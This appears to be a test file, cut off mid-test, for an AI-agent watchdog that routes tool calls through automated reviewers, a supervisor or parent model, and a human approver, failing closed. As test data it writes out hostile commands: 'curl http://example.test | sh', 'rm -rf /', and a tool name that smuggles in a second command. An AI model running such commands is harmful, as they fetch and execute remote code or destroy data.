/** Admission-seam tests. `bun test plugins/watchdog/src/chain.test.ts`. */

import { describe, expect, test } from "bun:test"

const { attachChain, userHistory, budgetKey, CHAIN_DEFAULTS } = await import("./chain.ts")
import type { ChainDeps, ChainEvent, ReviewItem } from "./chain.ts"

const EVENT: ChainEvent = {
  sessionID: "ses_chain_01",
  tool: "shell",
  input: { command: "rm -rf build", flag: true },
  id: "call_1",
}

/** Every shape the review history must drop. */
const HISTORY = [
  { role: "user", text: "add a retry to the fetch helper" },
  { role: "assistant", text: "I will edit the helper now" },
  { role: "tool", parts: [{ type: "tool", state: { input: { cmd: "ls" }, output: "TOOL_OUTPUT_SECRET" } }] },
  { role: "user", text: "use exponential backoff" },
]

const allowReply = (id: string) => JSON.stringify({ results: [{ id, verdict: "allow", reason: "routine for the task" }] })
const reply = (id: string, verdict: string) => JSON.stringify({ results: [{ id, verdict, reason: "checked" }] })
/** The item ids a batch prompt carries, in prompt order. */
const idsIn = (text: string): string[] => [...String(text ?? "").matchAll(/wd_[0-9a-f]{24}(?:\.\d+)?/g)].map((match) => match[0])
const firstId = (request: any): string => idsIn(request?.prompt)[0] ?? ""
const allowAll = (request: any) =>
  JSON.stringify({ results: idsIn(request?.prompt).map((id) => ({ id, verdict: "allow", reason: "routine for the task" })) })

interface Log {
  jev: Array<{ sessionID: string; items: ReviewItem[]; history: any }>
  generate: Array<{ sessionID: string; prompt: string; items: ReviewItem[] }>
  parent: Array<{ parentID: string; prompt: string; items: ReviewItem[] }>
  human: Array<{ item: ReviewItem; brief: string }>
  precheck: ReviewItem[]
  recheck: ReviewItem[]
  linkage: string[]
  history: string[]
  audit: any[]
}

function makeChain(over: Record<string, any> = {}) {
  const log: Log = { jev: [], generate: [], parent: [], human: [], precheck: [], recheck: [], linkage: [], history: [], audit: [] }
  const nodes = { jev: true, parent: true, supervisor: true, human: true, humanOnly: [] as string[], ...(over.nodes ?? {}) }
  const call = (value: any, ...args: any[]) => (typeof value === "function" ? value(...args) : value)
  const deps: ChainDeps = {
    enabled: over.enabled ?? (() => true),
    live: over.live ?? (() => true),
    nodes: () => nodes,
    linkage: async (sessionID: string) => {
      log.linkage.push(sessionID)
      return call(over.linkage ?? { parentID: null }, sessionID)
    },
    precheck: async (item: ReviewItem) => {
      log.precheck.push(item)
      return call(over.precheck ?? { ok: true }, item)
    },
    limits: over.limits ?? (() => CHAIN_DEFAULTS),
    jev: async (batch: { sessionID: string; items: ReviewItem[]; history: any }) => {
      log.jev.push(batch)
      if (typeof over.jevBatch === "function") return over.jevBatch(batch)
      const value = over.jev ?? "propagate"
      const per = typeof value === "function" ? value : () => value
      return new Map(batch.items.map((item) => [item.id, per(item, batch.history)]))
    },
    generate: async (request: { sessionID: string; prompt: string; items: ReviewItem[] }) => {
      log.generate.push(request)
      return call(over.generate ?? allowAll, request)
    },
    parentGenerate: async (request: { parentID: string; prompt: string; items: ReviewItem[] }) => {
      log.parent.push(request)
      return call(over.parentGenerate ?? allowAll, request)
    },
    ...(over.ledger ? { ledger: over.ledger } : {}),
    ...(over.ledgerError ? { ledgerError: over.ledgerError } : {}),
    ...(over.schedule ? { schedule: over.schedule } : {}),
    history: async (sessionID: string) => {
      log.history.push(sessionID)
      return call(over.history ?? HISTORY, sessionID)
    },
    human: async (item: ReviewItem, brief: string) => {
      log.human.push({ item, brief })
      return call(over.human ?? "allow", item, brief)
    },
    recheck: async (item: ReviewItem) => {
      log.recheck.push(item)
      return call(over.recheck ?? { ok: true }, item)
    },
    audit: (entry: any) => log.audit.push(entry),
  }
  return { chain: attachChain(deps), log, nodes, deps }
}

const stages = (log: Log) => log.audit.map((row: any) => [row.event, row.stage, row.verdict])

/** A few real timer turns: enough for the chain's microtasks and windows. */
const settle = async (turns = 5) => {
  for (let i = 0; i < turns; i++) await new Promise<void>((resolve) => setTimeout(resolve, 1))
}

const CALL = (sessionID: string, command = "ls") => ({ sessionID, tool: "shell", input: { command }, id: `call_${command}` })
const limitsWith = (over: Record<string, any> = {}) => () => ({ ...CHAIN_DEFAULTS, ...over })

/** A scheduler the test fires by hand, so no batch window waits on a clock. */
function handScheduler() {
  const timers: Array<() => void> = []
  return {
    timers,
    schedule: (_ms: number, fire: () => void) => {
      timers.push(fire)
      return () => {
        const at = timers.indexOf(fire)
        if (at >= 0) timers.splice(at, 1)
      }
    },
    fireAll: () => {
      for (const fire of timers.splice(0)) fire()
    },
  }
}
const finalReason = (log: Log) => String(log.audit[log.audit.length - 1]?.reason ?? "")

describe("activation", () => {
  test("disabled: admission is inert and consults no node", async () => {
    const { chain, log } = makeChain({ enabled: () => false })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(true)
    expect(decision.verdict).toBe("none")
    for (const rows of [log.precheck, log.jev, log.generate, log.human, log.audit]) expect(rows).toHaveLength(0)
  })
})

describe("review-item identity", () => {
  const idsFor = async (events: ChainEvent[]) => {
    const { chain } = makeChain({ jev: "deny" })
    const out: string[] = []
    for (const event of events) out.push((await chain.admit(event)).itemID)
    return out
  }

  test("the same session and exact action keep one id; a change makes a new one", async () => {
    const [base] = await idsFor([EVENT])
    // Identity is the binding; each admission adds its own sequence.
    expect((await idsFor([{ ...EVENT }]))[0].replace(/\.\d+$/, "")).toBe(base.replace(/\.\d+$/, ""))
    expect((await idsFor([{ ...EVENT, input: { command: "rm -rf dist", flag: true } }]))[0]).not.toBe(base)
    expect((await idsFor([{ ...EVENT, sessionID: "ses_chain_02" }]))[0]).not.toBe(base)
    expect((await idsFor([{ ...EVENT, tool: "bash" }]))[0]).not.toBe(base)
  })

  test("argument key order does not change the id, an aliased tool does", async () => {
    const [a, b, c, d] = await idsFor([
      { ...EVENT, tool: "write", input: { command: "ls", flag: true } },
      { ...EVENT, tool: "write", input: { flag: true, command: "ls" } },
      { ...EVENT, tool: "write", input: { flag: false, command: "ls" } },
      { ...EVENT, tool: "edit", input: { flag: true, command: "ls" } },
    ])
    // The binding is the digest; the admission sequence is this call's own.
    const binding = (id: string) => id.replace(/\.\d+$/, "")
    expect(binding(a)).toBe(binding(b))
    expect(binding(c)).not.toBe(binding(a))
    expect(binding(d)).not.toBe(binding(a))
  })

  test("a call with no session or tool is never authorized", async () => {
    const { chain, log } = makeChain()
    const decision = await chain.admit({ sessionID: "ses_chain_01", tool: "", input: {} })
    expect(decision.allow).toBe(false)
    expect(log.jev).toHaveLength(0)
  })
})

describe("routing", () => {
  test("Jev allow is terminal: no supervisor, no human, the call runs", async () => {
    const { chain, log } = makeChain({ jev: "allow" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(true)
    expect(decision.verdict).toBe("allow")
    expect(log.jev).toHaveLength(1)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(0)
    expect(log.recheck).toHaveLength(1)
  })

  test("Jev deny is terminal and stops the call", async () => {
    const { chain, log } = makeChain({ jev: "deny" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("deny")
    expect(decision.message).toMatch(/denied/)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(0)
    expect(log.recheck).toHaveLength(0)
  })

  test("Jev abort is terminal and reported as an abort", async () => {
    const { chain, log } = makeChain({ jev: "abort" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("abort")
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(0)
  })

  test("Jev propagate advances to the supervisor, which decides", async () => {
    const { chain, log } = makeChain({ jev: "propagate" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(true)
    expect(log.jev).toHaveLength(1)
    expect(log.generate).toHaveLength(1)
    expect(log.human).toHaveLength(0)
  })

  test("a supervisor propagate advances to the human, who decides", async () => {
    const { chain, log } = makeChain({ jev: "propagate", generate: (r: any) => reply(firstId(r), "propagate") })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(true)
    expect(log.human).toHaveLength(1)
  })

  test("an unavailable supervisor advances to the human instead of allowing", async () => {
    const { chain, log } = makeChain({
      jev: "propagate",
      generate: () => {
        throw new Error("session.generate failed")
      },
    })
    const decision = await chain.admit(EVENT)
    expect(log.human).toHaveLength(1)
    expect(decision.allow).toBe(true)
  })

  test("an unavailable Jev advances to the supervisor instead of allowing", async () => {
    const { chain, log } = makeChain({
      jev: () => {
        throw new Error("provider down")
      },
      generate: (r: any) => reply(firstId(r), "propagate"),
    })
    await chain.admit(EVENT)
    expect(log.generate).toHaveLength(1)
    expect(log.human).toHaveLength(1)
  })

  test("a host deny is absolute: no node is asked and the call does not run", async () => {
    const { chain, log } = makeChain({ precheck: { ok: false, reason: "the host denies this call" } })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(finalReason(log)).toContain("the host denies this call")
    expect(log.jev).toHaveLength(0)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(0)
  })

  test("a precheck that cannot run denies rather than allowing", async () => {
    const { chain, log } = makeChain({
      precheck: () => {
        throw new Error("ban store unreadable")
      },
    })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(log.jev).toHaveLength(0)
  })

  test("a host ask is a human-only action: no automated node may authorize it", async () => {
    const { chain, log } = makeChain({ precheck: { ok: true, humanOnly: true }, jev: "allow" })
    const decision = await chain.admit(EVENT)
    expect(log.jev).toHaveLength(0)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(1)
    expect(decision.allow).toBe(true)
  })
})

describe("node enablement", () => {
  test("a disabled Jev node skips to the supervisor without approving", async () => {
    const { chain, log } = makeChain({ nodes: { jev: false }, generate: (r: any) => reply(firstId(r), "deny") })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(log.jev).toHaveLength(0)
    expect(log.generate).toHaveLength(1)
  })

  test("a disabled supervisor node skips a Jev propagate straight to the human", async () => {
    const { chain, log } = makeChain({ nodes: { supervisor: false }, jev: "propagate" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(true)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(1)
  })

  test("a disabled human node leaves a propagated item unresolved, granting nothing", async () => {
    const { chain, log } = makeChain({
      nodes: { human: false },
      jev: "propagate",
      generate: (r: any) => reply(firstId(r), "propagate"),
    })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("unresolved")
    expect(log.human).toHaveLength(0)
  })

  test("every node disabled exhausts the chain without authorizing", async () => {
    const { chain, log } = makeChain({ nodes: { jev: false, supervisor: false, human: false } })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("unresolved")
    expect(log.jev).toHaveLength(0)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(0)
  })

  test("exhausting the chain after a propagate grants nothing", async () => {
    const { chain } = makeChain({ nodes: { human: false }, jev: "propagate", generate: () => reply("other-id", "allow") })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(decision.message).toMatch(/did not run/)
  })

  test("an unavailable human node grants nothing", async () => {
    const { chain } = makeChain({ nodes: { jev: false, supervisor: false }, human: "unavailable" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("unresolved")
  })

  test("a human-only action with the human node disabled is denied, never automated", async () => {
    const { chain, log } = makeChain({ nodes: { humanOnly: ["shell"], human: false }, jev: "allow" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(log.jev).toHaveLength(0)
    expect(log.human).toHaveLength(0)
  })
})

describe("the human node", () => {
  test("a human deny stops the call", async () => {
    const { chain } = makeChain({ nodes: { jev: false, supervisor: false }, human: "deny" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("deny")
  })

  test("a human abort is reported as an abort", async () => {
    const { chain } = makeChain({ nodes: { jev: false, supervisor: false }, human: "abort" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("abort")
  })

  test("the card carries the exact action, its task, and the item id", async () => {
    const { chain, log } = makeChain({ nodes: { jev: false, supervisor: false } })
    const decision = await chain.admit(EVENT)
    const brief = log.human[0].brief
    expect(brief).toContain("shell")
    expect(brief).toContain('Arguments: {"command":"rm -rf build","flag":true}')
    expect(brief).toContain("use exponential backoff")
    expect(brief).toContain(decision.itemID)
  })

  test("an approval for one held call never releases a sibling", async () => {
    const answers = new Map<string, (value: any) => void>()
    const { chain, log } = makeChain({
      nodes: { jev: false, supervisor: false },
      human: (item: ReviewItem) => new Promise((resolve) => answers.set(item.id, resolve)),
    })
    const first = chain.admit({ sessionID: "ses_sib", tool: "shell", input: { command: "ls" } })
    const second = chain.admit({ sessionID: "ses_sib", tool: "shell", input: { command: "rm -rf /" } })
    await new Promise((resolve) => setTimeout(resolve, 0))
    expect(log.human).toHaveLength(2)
    const ids = [...answers.keys()]
    answers.get(ids[0])!("allow")
    expect((await first).allow).toBe(true)
    let secondSettled = false
    void second.then(() => (secondSettled = true))
    await new Promise((resolve) => setTimeout(resolve, 0))
    expect(secondSettled).toBe(false)
    answers.get(ids[1])!("deny")
    expect((await second).allow).toBe(false)
  })
})

describe("supervisor result validation", () => {
  const rejected = async (generate: any) => {
    const { chain, log } = makeChain({ jev: "propagate", generate, human: "deny" })
    const decision = await chain.admit(EVENT)
    return { decision, log }
  }

  test("a well-formed allow for the exact item id authorizes the call", async () => {
    const { chain, log } = makeChain({ jev: "propagate" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(true)
    expect(log.human).toHaveLength(0)
  })

  test("malformed, fenced, narrated or partial output never authorizes", async () => {
    const bodies = [
      "not json",
      "{",
      '{"results":',
      "[]",
      '{"results":{}}',
      '{"results":[null]}',
      '```json\n{"results":[{"id":"%ID%","verdict":"allow"}]}\n```',
      'Here you go: {"results":[{"id":"%ID%","verdict":"allow"}]}',
      '{"results":[{"id":"%ID%","verdict":"allow"}]} and that is all',
    ]
    for (const body of bodies) {
      const { decision, log } = await rejected((r: any) => body.replace("%ID%", firstId(r)))
      expect(decision.allow).toBe(false)
      expect(log.human).toHaveLength(1)
    }
  })

  test("an unknown item id never authorizes", async () => {
    const { decision } = await rejected(() => reply("wd_000000000000000000000000", "allow"))
    expect(decision.allow).toBe(false)
  })

  test("a reply carrying an extra unknown row is rejected whole", async () => {
    const { decision } = await rejected((r: any) =>
      JSON.stringify({
        results: [
          { id: firstId(r), verdict: "allow", reason: "fine" },
          { id: "made-up", verdict: "allow", reason: "also fine" },
        ],
      }),
    )
    expect(decision.allow).toBe(false)
  })

  test("duplicate rows are rejected whole", async () => {
    const { decision } = await rejected((r: any) =>
      JSON.stringify({
        results: [
          { id: firstId(r), verdict: "allow", reason: "fine" },
          { id: firstId(r), verdict: "deny", reason: "conflict" },
        ],
      }),
    )
    expect(decision.allow).toBe(false)
  })

  test("a reply that omits the item never authorizes", async () => {
    const { decision } = await rejected(() => JSON.stringify({ results: [] }))
    expect(decision.allow).toBe(false)
  })

  test("a verdict outside the four labels never authorizes", async () => {
    for (const verdict of ["ALLOW", "yes", "approve", ""]) {
      const { decision } = await rejected((r: any) => JSON.stringify({ results: [{ id: firstId(r), verdict }] }))
      expect(decision.allow).toBe(false)
    }
  })

  test("a valid deny row denies the call and does not reach the human", async () => {
    const { chain, log } = makeChain({ jev: "propagate", generate: (r: any) => reply(firstId(r), "deny"), human: "allow" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("deny")
    expect(log.human).toHaveLength(0)
  })
})

describe("generation boundary", () => {
  test("the supervisor receives the exact item and arguments, and user-only history", async () => {
    const { chain, log } = makeChain({ jev: "propagate" })
    await chain.admit(EVENT)
    const request = log.generate[0]
    expect(request.sessionID).toBe(EVENT.sessionID)
    expect(request.items[0].input).toEqual(EVENT.input)
    expect(idsIn(request.prompt)).toHaveLength(1)
    expect(request.prompt).toContain('"command":"rm -rf build"')
    expect(request.prompt).toContain("add a retry to the fetch helper")
    expect(request.prompt).toContain("use exponential backoff")
    expect(request.prompt).not.toContain("I will edit the helper now")
    expect(request.prompt).not.toContain("TOOL_OUTPUT_SECRET")
  })

  test("Jev receives the same user-only history and no other role", async () => {
    const { chain, log } = makeChain({ jev: "propagate" })
    await chain.admit(EVENT)
    const history = log.jev[0].history
    expect(history.complete).toBe(true)
    expect(history.entries.map((entry: any) => entry.text)).toEqual(["add a retry to the fetch helper", "use exponential backoff"])
  })

  test("no generation happens when an earlier stage decides", async () => {
    const { chain, log } = makeChain({ jev: "deny" })
    await chain.admit(EVENT)
    expect(log.generate).toHaveLength(0)
  })

  test("a subagent's LLM stage is its direct Parent, never Supervisor", async () => {
    const { chain, log } = makeChain({ linkage: { parentID: "ses_parent_01" }, jev: "propagate" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(true)
    expect(log.parent).toHaveLength(1)
    expect(log.parent[0].parentID).toBe("ses_parent_01")
    expect(log.generate).toHaveLength(0)
    const rows = log.audit.filter((row: any) => row.event === "chain_stage")
    expect(rows.map((row: any) => row.stage)).toEqual(["jev", "parent"])
  })

  test("an unavailable Parent advances to the human, never Supervisor", async () => {
    const { chain, log } = makeChain({
      linkage: { parentID: "ses_parent_02" },
      jev: "propagate",
      parentGenerate: () => {
        throw new Error("the parent generation failed")
      },
      human: "deny",
    })
    const decision = await chain.admit(EVENT)
    expect(decision.verdict).toBe("deny")
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(1)
    const rows = log.audit.filter((row: any) => row.event === "chain_stage")
    expect(rows.map((row: any) => [row.stage, row.verdict])).toEqual([
      ["jev", "propagate"],
      ["parent", "unavailable"],
      ["human", "deny"],
    ])
  })

  test("a linkage that cannot be read is an unavailable Parent, not a root", async () => {
    let reads = 0
    const { chain, log } = makeChain({
      linkage: () => {
        if (reads++ > 0) return { parentID: null }
        throw new Error("session lookup failed")
      },
      jev: "propagate",
      human: "allow",
    })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(true)
    expect(log.parent).toHaveLength(0)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(1)
    // Supervisor never stands in for the Parent that could not be read.
    expect(log.audit.some((row: any) => row.stage === "supervisor")).toBe(false)
  })

  test("a disabled Parent skips without authorizing anything", async () => {
    const { chain, log } = makeChain({
      nodes: { parent: false },
      linkage: { parentID: "ses_parent_03" },
      jev: "propagate",
      human: "allow",
    })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(true)
    expect(log.parent).toHaveLength(0)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(1)
  })

  test("a Parent reply for another item authorizes nothing", async () => {
    const { chain, log } = makeChain({
      linkage: { parentID: "ses_parent_04" },
      jev: "propagate",
      parentGenerate: () => JSON.stringify({ results: [{ id: "wd_other.1", verdict: "allow" }] }),
      human: "deny",
    })
    const decision = await chain.admit(EVENT)
    expect(decision.verdict).toBe("deny")
    expect(log.human).toHaveLength(1)
  })

  test("the Parent prompt carries the exact task and the items, not the filtered list", async () => {
    const { chain, log } = makeChain({ linkage: { parentID: "ses_parent_05" }, jev: "propagate" })
    await chain.admit(EVENT)
    const prompt = log.parent[0].prompt
    expect(prompt).toContain("use exponential backoff")
    expect(prompt).toContain("Tool: shell")
    expect(prompt).toContain('Arguments: {"command":"rm -rf build","flag":true}')
    // The inherited context is the history: no filtered user list, no older prompt.
    expect(prompt).not.toContain("Genuine user messages")
    expect(prompt).not.toContain("add a retry to the fetch helper")
  })

  test("the Parent inherits its context: the filtered history is the Supervisor's, not its own", async () => {
    const { chain, log } = makeChain({ linkage: { parentID: "ses_parent_06" }, jev: "propagate" })
    await chain.admit(EVENT)
    // The Parent's own projection is read for usability, never filtered into a list.
    expect(log.history).toContain("ses_parent_06")
    expect(log.parent[0].prompt).not.toContain("TOOL_OUTPUT_SECRET")
  })

  test("a clipped current task makes the Parent unavailable", async () => {
    const long = "x".repeat(9000)
    const { chain, log } = makeChain({
      linkage: { parentID: "ses_parent_07" },
      jev: "propagate",
      history: [{ role: "user", text: long }],
      human: "deny",
    })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(log.parent).toHaveLength(0)
    // A task that cannot be shown exactly cannot be judged or carded.
    expect(finalReason(log)).toContain("the exact action cannot be shown on a card")
  })

  test("an unreadable Parent context is unavailable review, never an empty history", async () => {
    const { chain, log } = makeChain({
      linkage: { parentID: "ses_parent_08" },
      jev: "propagate",
      history: async (sessionID: string) => {
        if (sessionID === "ses_parent_08") return "not a context"
        return HISTORY
      },
      human: "deny",
    })
    const decision = await chain.admit(EVENT)
    expect(decision.verdict).toBe("deny")
    expect(log.parent).toHaveLength(0)
    expect(log.human).toHaveLength(1)
  })

  test("a root session still reaches Supervisor and never the Parent stage", async () => {
    const { chain, log } = makeChain({ jev: "propagate" })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(true)
    expect(log.generate).toHaveLength(1)
    expect(log.parent).toHaveLength(0)
    // The exact task is explicit, not only the newest list entry.
    expect(log.generate[0].prompt).toContain("Exact current task for the producing session:")
    expect(log.generate[0].prompt).toContain("use exponential backoff")
    const rows = log.audit.filter((row: any) => row.event === "chain_stage")
    expect(rows.map((row: any) => row.stage)).toEqual(["jev", "supervisor"])
  })

  test("unreadable history is unavailability, never a judgment basis", async () => {
    const { chain, log } = makeChain({
      jev: "propagate",
      history: async () => {
        throw new Error("context read failed")
      },
    })
    const decision = await chain.admit(EVENT)
    expect(log.jev).toHaveLength(0)
    expect(log.generate).toHaveLength(0)
    expect(decision.allow).toBe(false)
    expect(finalReason(log)).toContain("user history unavailable")
  })

  test("a clipped current task makes the supervisor unavailable, not lenient", async () => {
    const long = "x".repeat(9000)
    const { chain, log } = makeChain({ jev: "propagate", history: [{ role: "user", text: long }] })
    const decision = await chain.admit(EVENT)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(0)
    expect(decision.allow).toBe(false)
    expect(finalReason(log)).toContain("the exact action cannot be shown on a card")
  })

  test("an action too large for a card fails closed instead of truncating", async () => {
    const { chain, log } = makeChain({ nodes: { jev: false, supervisor: false }, history: [{ role: "user", text: "small task" }] })
    const huge = { command: "y".repeat(2000) }
    const decision = await chain.admit({ sessionID: "ses_big", tool: "shell", input: huge })
    expect(log.human).toHaveLength(0)
    expect(decision.allow).toBe(false)
    expect(finalReason(log)).toContain("cannot be shown on a card")
  })
})

describe("user provenance", () => {
  test("a user message contributes its text only, never a tool, reasoning or file part", async () => {
    const mixed = [
      {
        role: "user",
        parts: [
          { type: "text", text: "real task text" },
          { type: "reasoning", text: "REASONING_SECRET" },
          { type: "tool", state: { output: "TOOL_OUTPUT_SECRET" } },
          { type: "file", text: "FILE_BODY_SECRET" },
        ],
      },
    ]
    const { chain, log } = makeChain({ jev: "propagate", history: mixed })
    await chain.admit(EVENT)
    const history = log.jev[0].history
    expect(history.entries).toHaveLength(1)
    expect(history.current.text).toContain("real task text")
    for (const secret of ["REASONING_SECRET", "TOOL_OUTPUT_SECRET", "FILE_BODY_SECRET"]) expect(history.current.text).not.toContain(secret)
  })

  test("the newest task is budgeted first, so an older prompt is the one clipped", async () => {
    const older = { role: "user", text: "old ".repeat(3000) }
    const { chain, log } = makeChain({ jev: "propagate", history: [older, { role: "user", text: "the current task" }] })
    await chain.admit(EVENT)
    const history = log.jev[0].history
    expect(history.current.text).toBe("the current task")
    expect(history.current.truncated).toBe(false)
    expect(history.entries[0].truncated).toBe(true)
    expect(history.bounded).toBe(true)
  })

  test("a newest user turn with no text means no task, never an older one", async () => {
    const history = userHistory([
      { role: "user", text: "the old task" },
      { role: "user", parts: [{ type: "file", path: "/etc/hosts" }] },
    ])
    expect(history.current).toBeNull()
    expect(history.entries).toEqual([])

    const { chain, log } = makeChain({ jev: "allow", history: history.entries })
    const decision = await chain.admit(EVENT)
    expect(log.jev).toHaveLength(0)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(0)
    expect(decision.allow).toBe(false)
    expect(finalReason(log)).toContain("user history unavailable")
  })

  test("task text rewritten by redaction is unreviewable", async () => {
    const history = userHistory([{ role: "user", text: "deploy with api_key=abcdef123456 now" }])
    expect(history.current?.altered).toBe(true)

    const { chain, log } = makeChain({ jev: "allow", generate: (r: any) => allowReply(firstId(r)), history: [{ role: "user", text: "deploy with api_key=abcdef123456 now" }] })
    const decision = await chain.admit(EVENT)
    expect(log.jev).toHaveLength(0)
    expect(log.generate).toHaveLength(0)
    expect(log.human).toHaveLength(0)
    expect(decision.allow).toBe(false)
    expect(finalReason(log)).toContain("altered by redaction")
  })

  test("an older prompt rewritten by redaction keeps its marker without poisoning the task", async () => {
    const history = userHistory([
      { role: "user", text: "earlier: api_key=abcdef123456" },
      { role: "user", text: "the current task" },
    ])
    expect(history.current?.altered).toBe(false)
    expect(history.current?.text).toBe("the current task")
    expect(history.entries[0].altered).toBe(true)
  })

  test("a clipped current task blocks Jev as well as the supervisor", async () => {
    const { chain, log } = makeChain({ jev: "allow", history: [{ role: "user", text: "x".repeat(9000) }] })
    const decision = await chain.admit(EVENT)
    expect(log.jev).toHaveLength(0)
    expect(log.generate).toHaveLength(0)
    expect(decision.allow).toBe(false)
    expect(finalReason(log)).toContain("the current task is clipped")
  })
})

describe("human card exactness", () => {
  test("a redacted argument gives no card rather than an unclear one", async () => {
    const { chain, log } = makeChain({ nodes: { jev: false, supervisor: false } })
    const decision = await chain.admit({
      sessionID: "ses_secret_card",
      tool: "shell",
      input: { command: "curl -H 'Authorization: Bearer abcdefghijklmnopqrstuvwx' x" },
    })
    expect(log.human).toHaveLength(0)
    expect(decision.allow).toBe(false)
    expect(finalReason(log)).toContain("cannot be shown on a card")
  })

  test("two calls differing only inside a redacted value get no card rather than one identical card", async () => {
    const { chain, log } = makeChain({ nodes: { jev: false, supervisor: false } })
    const one = await chain.admit({ sessionID: "ses_amb", tool: "shell", input: { command: "deploy --token=aaaaaaaabbbbbbbb" } })
    const two = await chain.admit({ sessionID: "ses_amb", tool: "shell", input: { command: "deploy --token=ccccccccdddddddd" } })
    expect(one.itemID).not.toBe(two.itemID)
    expect(log.human).toHaveLength(0)
  })
})

describe("identifier hygiene", () => {
  test("a session id is redacted and masked before audit rows or the message", async () => {
    const secret = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
    const { chain, log } = makeChain({ jev: "deny" })
    const decision = await chain.admit({ sessionID: `ses_01 ${secret}`, tool: "shell", input: { command: "ls" } })
    const text = JSON.stringify(log.audit) + String(decision.message ?? "")
    expect(text).not.toContain(secret)
    for (const row of log.audit) expect(String(row.sessionID).length).toBeLessThanOrEqual(64)
    expect(String(decision.message)).toContain("shell")
  })

  test("a tool name that cannot be presented exactly is never reviewed or echoed", async () => {
    for (const tool of ["shell; rm -rf /", "a".repeat(80)]) {
      const { chain, log } = makeChain({ jev: "allow" })
      const decision = await chain.admit({ sessionID: "ses_odd", tool, input: { command: "ls" } })
      expect(decision.allow).toBe(false)
      expect(decision.verdict).toBe("unresolved")
      expect(log.jev).toHaveLength(0)
      expect(log.generate).toHaveLength(0)
      expect(log.human).toHaveLength(0)
      expect(finalReason(log)).toContain("cannot be presented exactly")
      expect(JSON.stringify(log.audit)).not.toContain("rm -rf")
      expect(String(decision.message)).not.toContain("<")
    }
  })
})

describe("execution boundary", () => {
  test("a release rechecks the host state, and a failed recheck stops the call", async () => {
    const { chain, log } = makeChain({ jev: "allow", recheck: { ok: false, reason: "the session was banned while the call was held" } })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(finalReason(log)).toContain("banned while the call was held")
  })

  test("a host ask that appears during the hold stops an automated allow", async () => {
    const { chain, log } = makeChain({
      jev: "allow",
      recheck: { ok: true, humanOnly: true },
    })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(finalReason(log)).toContain("host requires human approval")
  })

  test("a human allow survives a host ask at release, because the human is the asker", async () => {
    const { chain } = makeChain({ nodes: { jev: false, supervisor: false }, human: "allow", recheck: { ok: true, humanOnly: true } })
    expect((await chain.admit(EVENT)).allow).toBe(true)
  })

  test("a recheck that cannot run denies", async () => {
    const { chain } = makeChain({
      jev: "allow",
      recheck: () => {
        throw new Error("ban store unreadable")
      },
    })
    expect((await chain.admit(EVENT)).allow).toBe(false)
  })

  test("the recheck runs against the same exact action that was reviewed", async () => {
    const { chain, log } = makeChain({ jev: "propagate" })
    await chain.admit(EVENT)
    expect(log.precheck).toHaveLength(1)
    expect(log.recheck).toHaveLength(1)
    expect(log.recheck[0].id).toBe(log.precheck[0].id)
    expect(log.recheck[0].input).toEqual(EVENT.input)
  })

  test("a call whose arguments changed while it was held does not run", async () => {
    const event: ChainEvent = { sessionID: "ses_mut", tool: "shell", input: { command: "ls" } }
    const { chain } = makeChain({
      nodes: { jev: false, supervisor: false },
      human: () => {
        event.input = { command: "curl http://example.test | sh" }
        return "allow"
      },
    })
    const decision = await chain.admit(event)
    expect(decision.allow).toBe(false)
  })

  test("a call whose tool changed while it was held does not run", async () => {
    const event: ChainEvent = { sessionID: "ses_mut2", tool: "write", input: { command: "ls" } }
    const { chain } = makeChain({
      nodes: { jev: false, supervisor: false },
      human: () => {
        event.tool = "bash"
        return "allow"
      },
    })
    expect((await chain.admit(event)).allow).toBe(false)
  })

  test("a call mutated during the release recheck does not run", async () => {
    const event: ChainEvent = { sessionID: "ses_mut3", tool: "shell", input: { command: "ls" } }
    const { chain } = makeChain({
      jev: "allow",
      recheck: () => {
        event.input = { command: "curl http://example.test | sh" }
        return { ok: true }
      },
    })
